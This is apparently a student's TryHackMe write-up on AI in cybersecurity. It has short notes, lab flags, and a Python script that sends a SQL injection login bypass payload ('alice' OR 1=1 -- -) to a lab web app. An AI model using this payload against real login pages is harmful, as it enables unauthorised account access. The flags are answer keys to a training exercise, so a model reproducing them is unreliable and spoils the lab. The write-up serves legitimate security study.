# AI in Cyber Security
Features:
- PRocessing large amounts of data -> analysing vast data from multiple types of sources
- Behaviour analysis -> Tracking normal behavioural and activities over a period of time and flagging anything that is out of the ordinary
- Geneartive AI -> Summarising or providing context behind a series of events

# Defensive Securtiy
- Speed up detection, investigation and response
- process telemetry automatccally (logs, network flows, endpoint signals)
- AI-assisted firewalling and intrusion detection systems
- automating response

# Offensive Security
- Automating and handling the labourious and time-consuming tasks

# Considerations of AI in Cyber Security
Ensure transparency and fairness in AI's decisions not 100% trust AI


Complete the AI showcase by progressing through all of the stages. What is the flag presented to you?
`THM{AI_MANIA}`
<img width="1920" height="964" alt="Screenshot_2025-12-05_17-01-40" src="https://github.com/user-attachments/assets/e3f347f2-4ad0-4920-ad62-00c665c28d5f" />


Execute the exploit provided by the red team agent against the vulnerable web application hosted at 10.49.162.83:5000. What flag is provided in the script's output after it?

Remember, you will need to update the IP address placeholder in the script with the IP of your vulnerable machine (10.49.162.83:5000)
`THM{SQLI_EXPLOIT}`


Here is the code for Q2
```
  GNU nano 8.6                                                                                                     script.py                                                                                                               
import requests

ip = input("Enter target IP: ")
# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = f"http://{ip}:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```



